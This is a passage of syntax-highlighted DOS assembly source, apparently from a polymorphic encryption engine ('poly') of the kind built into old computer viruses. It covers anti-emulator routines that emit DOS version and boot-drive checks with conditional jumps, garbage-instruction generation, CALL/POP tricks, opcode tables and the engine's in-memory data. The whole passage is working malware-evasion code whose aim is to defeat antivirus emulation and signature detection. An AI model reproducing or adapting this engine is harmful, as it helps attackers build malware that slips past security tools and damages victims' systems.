        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">cmp_check</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; reset both checks</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">cmp_check2</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ob_oc</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">98h</span><span class="sc4">,</span><span class="sc2">0f8h</span><span class="sc4">,</span><span class="sc2">0cch</span><span class="sc4">,</span><span class="sc2">0f9h</span><span class="sc4">,</span><span class="sc2">0fch</span><span class="sc4">,</span><span class="sc2">0fdh</span><span class="sc4">,</span><span class="sc2">0f5h</span><span class="sc4">,</span><span class="sc2">0cch</span><span class="sc0">  </span><span class="sc1">; one byters</span><span class="sc0">

</span><span class="sc5">one_byters</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ob_oc</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">do_antiemulator</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">cmp_check2</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">cont_antiemu</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">end_antiemu</span><span class="sc0">

</span><span class="sc5">cont_antiemu</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">nocx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">count_reg</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">get_bdrive</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">cant_use</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">  </span><span class="sc1">; cx</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">canuse</span><span class="sc0">
</span><span class="sc5">cant_use</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">end_antiemu</span><span class="sc0">
</span><span class="sc5">canuse</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">get_dos_ver</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">set_wrong_time</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">one_byters</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">do_a_call</span><span class="sc0">

</span><span class="sc5">set_wrong_time</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                  </span><span class="sc1">; can we use DX ?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">end_antiemu</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">withcl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0b5h</span><span class="sc0">                 </span><span class="sc1">; mov ch,</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">19h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">get_rnd_tset</span><span class="sc0">
</span><span class="sc5">withcl</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0b1h</span><span class="sc0">                 </span><span class="sc1">; mov cl,</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">03dh</span><span class="sc0">
</span><span class="sc5">get_rnd_tset</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">get_rnd_tset</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                   </span><span class="sc1">; store the mov</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">nocx</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">  </span><span class="sc1">; enable no cx change</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_garbage</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">nocx</span><span class="sc4">],</span><span class="sc2">0ffh</span><span class="sc0"> </span><span class="sc1">; enable cx changing</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2db4h</span><span class="sc0">                </span><span class="sc1">; mov ah,2dh</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                   </span><span class="sc1">; test al</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">                   </span><span class="sc1">; compare with 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                  </span><span class="sc1">; jne</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">store_and_jump</span><span class="sc0">



</span><span class="sc5">get_dos_ver</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                  </span><span class="sc1">; can we change bx</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">end_antiemu</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">end_antiemu</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">point_reg</span><span class="sc4">],</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">end_antiemu</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">30b4h</span><span class="sc0">                </span><span class="sc1">; get dos version</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">                  </span><span class="sc1">; JAE</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">ok_this</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                  </span><span class="sc1">; JA</span><span class="sc0">
</span><span class="sc5">ok_this</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">011b</span><span class="sc0">                 </span><span class="sc1">; 0 - 3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">store_and_jump</span><span class="sc0">

</span><span class="sc5">get_bdrive</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                  </span><span class="sc1">; is dx usable?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">end_antiemu</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">end_antiemu</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">                 </span><span class="sc1">; mov ax,</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3305h</span><span class="sc0">                </span><span class="sc1">; get boot drive</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                  </span><span class="sc1">; check DL</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">                   </span><span class="sc1">; compare with 00h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                  </span><span class="sc1">; JNE</span><span class="sc0">

</span><span class="sc5">store_and_jump</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">21cdh</span><span class="sc0">                </span><span class="sc1">; int 21h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">82h</span><span class="sc0">                  </span><span class="sc1">; cmp</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0f8h</span><span class="sc0">                 </span><span class="sc1">; cmp base</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                   </span><span class="sc1">; dl contains register</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">                   </span><span class="sc1">; dh contains value</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">emu_trick</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">cmp_check2</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                  </span><span class="sc1">; cl contains type of jump</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">conditional_jump</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">emu_trick</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">cmp_check2</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">end_antiemu</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">do_a_call</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0e8h</span><span class="sc0">                 </span><span class="sc1">; make a CALL</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_garbage</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                   </span><span class="sc1">; calculate offset</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">     </span><span class="sc1">; here we will CALL</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_garbage</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">push_nr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; AH = usable register</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">no_pop_segment</span><span class="sc0">          </span><span class="sc1">; pop the IP</span><span class="sc0">

</span><span class="sc5">instructions</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; the data below this line is of use by the poly to create some of the</span><span class="sc0">
</span><span class="sc1">; various possible operations on registers in the trash generation part</span><span class="sc0">

</span><span class="sc1">;ONE BYTE ONLY</span><span class="sc0">
</span><span class="sc5">inc_16</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">040h</span><span class="sc0">    </span><span class="sc1">; INC REG16</span><span class="sc0">
</span><span class="sc5">dec_16</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">048h</span><span class="sc0">    </span><span class="sc1">; DEC REG16</span><span class="sc0">
</span><span class="sc5">mov_rr16</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">08bh</span><span class="sc0">    </span><span class="sc1">; general first byte</span><span class="sc0">
</span><span class="sc1">; + 0 (03h) ADD</span><span class="sc0">
</span><span class="sc1">; + 8 (0bh) OR</span><span class="sc0">
</span><span class="sc1">; + 10 (13h) ADC</span><span class="sc0">
</span><span class="sc1">; + 18 (1bh) SBB</span><span class="sc0">
</span><span class="sc1">; + 20 (23h) AND</span><span class="sc0">
</span><span class="sc1">; + 28 (2bh) SUB</span><span class="sc0">
</span><span class="sc1">; + 30 (33h) XOR</span><span class="sc0">
</span><span class="sc1">; + 38 (3bh) CMP</span><span class="sc0">
</span><span class="sc5">math_rr16</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03h</span><span class="sc0">    </span><span class="sc1">; basic opcode</span><span class="sc0">
</span><span class="sc5">not_neg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0d0h</span><span class="sc0">
</span><span class="sc5">rot_1</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0d1h</span><span class="sc0">    </span><span class="sc1">; ROL/ROR/SHL/SHR/RCR/RCL/SAR/SAL REG16,1</span><span class="sc0">
</span><span class="sc5">rot_cl</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0d3h</span><span class="sc0">    </span><span class="sc1">; ROL REG16,CL</span><span class="sc0">
</span><span class="sc1">; +0h (0c0h)     ADD</span><span class="sc0">
</span><span class="sc1">; +8h (0c8h)     OR</span><span class="sc0">
</span><span class="sc1">; +10h (0d0h)    ADC</span><span class="sc0">
</span><span class="sc1">; +18h (0d8h)    SBB</span><span class="sc0">
</span><span class="sc1">; +20h (0e0h)    AND</span><span class="sc0">
</span><span class="sc1">; +28h (0e8h)    SUB</span><span class="sc0">
</span><span class="sc1">; +30h (0f0h)    XOR</span><span class="sc0">
</span><span class="sc1">; +38h (0f8h)    CMP</span><span class="sc0">
</span><span class="sc5">add_r16i</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c0h</span><span class="sc0">    </span><span class="sc1">; ADD REG16,IMMEDIATE 2 byte</span><span class="sc0">
</span><span class="sc5">lea_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b8h</span><span class="sc0">    </span><span class="sc1">; LEA REG16,something</span><span class="sc0">

</span><span class="sc5">smpe_encrypted_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; Poly data start - This will be only in memory!</span><span class="sc0">

</span><span class="sc5">poly_data_mem</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; must remain in this sequence (since we use SI + x to adress this in the</span><span class="sc0">
</span><span class="sc1">; main poly loop)</span><span class="sc0">

</span><span class="sc5">enc_lenght</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">last_done</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">reg8bits</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">pointer_di</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">secphs</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">isword</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">; 00h = byte  operation</span><span class="sc0">
                                </span><span class="sc1">; 01h = word  operation</span><span class="sc0">
                                </span><span class="sc1">; 02h = dword operation</span><span class="sc0">
</span><span class="sc5">isrolror</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">; 00h = no ROR/ROL</span><span class="sc0">
                                </span><span class="sc1">; 01h = ROR/ROL with stable CL</span><span class="sc0">
                                </span><span class="sc1">; 02h = ROR/ROL with inc/dec CL</span><span class="sc0">
</span><span class="sc5">push_nr</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">can_doda</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">count_reg</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0ffh</span><span class="sc0">
</span><span class="sc5">point_reg</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0ffh</span><span class="sc0">
</span><span class="sc5">nocx</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0ffh</span><span class="sc0">     
</span><span class="sc5">seg_sta</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0ffh</span><span class="sc0">

</span><span class="sc5">emu_trick</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">inverse</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">cmp_check</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">cmp_check2</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">ds_mody</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">; 00 don't modify, 01 can modify</span><span class="sc0">

</span><span class="sc5">counter_pos</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">jz_nr</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">no_imm</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">; 00h use immediate when enc/dec</span><span class="sc0">
                                </span><span class="sc1">; 01h use register  when enc/dec</span><span class="sc0">

</span><span class="sc1">; Poly data end</span><span class="sc0">

</span><span class="sc5">poly_data_mem_end</span><span class="sc4">:</span><span class="sc0">


</span></div></body>
</html>
